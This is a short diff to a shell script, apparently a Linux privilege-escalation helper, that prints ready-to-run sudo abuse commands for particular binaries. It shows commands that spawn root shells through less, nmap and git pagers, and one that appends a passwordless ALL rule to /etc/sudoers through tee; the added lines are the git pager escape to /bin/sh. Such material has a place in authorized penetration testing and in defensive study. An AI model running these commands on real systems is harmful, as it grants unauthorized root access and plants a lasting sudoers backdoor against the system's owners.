@@ -980,6 +980,8 @@ parse_linux_output() {
                     less|more) echo "sudo ${bin} /etc/passwd  # type: !bash" ;;
                     nmap)      echo "echo 'os.execute(\"/bin/bash\")' > /tmp/n.nse && sudo ${bin} --script /tmp/n.nse" ;;
                     tee)       echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo ${bin} -a /etc/sudoers" ;;
+                    git)       echo "sudo ${bin} -p help config  # pager opens — type: !/bin/sh"
+                               echo "# or:  sudo ${bin} branch --help  # same pager trick" ;;
                     *)         echo "# https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
                 esac
                 echo ""
